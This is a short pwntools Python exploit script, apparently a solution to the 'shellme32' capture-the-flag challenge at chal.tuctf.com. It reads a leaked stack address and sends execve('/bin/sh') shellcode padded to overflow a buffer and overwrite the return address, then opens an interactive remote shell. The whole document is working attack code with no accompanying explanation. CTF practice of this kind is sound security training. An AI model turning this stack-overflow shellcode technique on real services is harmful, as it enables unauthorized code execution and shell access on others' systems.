#!/usr/bin/python3
from pwn import *

p = remote('chal.tuctf.com', 30506)
# p = process('./shellme32')

p.recvuntil(b'\x0a')
stack = int(p.recv(10), 16)
log.info('stack : %s' % hex(stack))

sc = asm('''
    push 0x0068732f
    push 0x6e69622f
    mov eax, 0xb
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
    ''')

raw_input('>')
payload = sc.ljust(0x24, b'a') + b'b' * 0x4 + p32(stack)
p.sendlineafter('>', payload)

p.interactive()
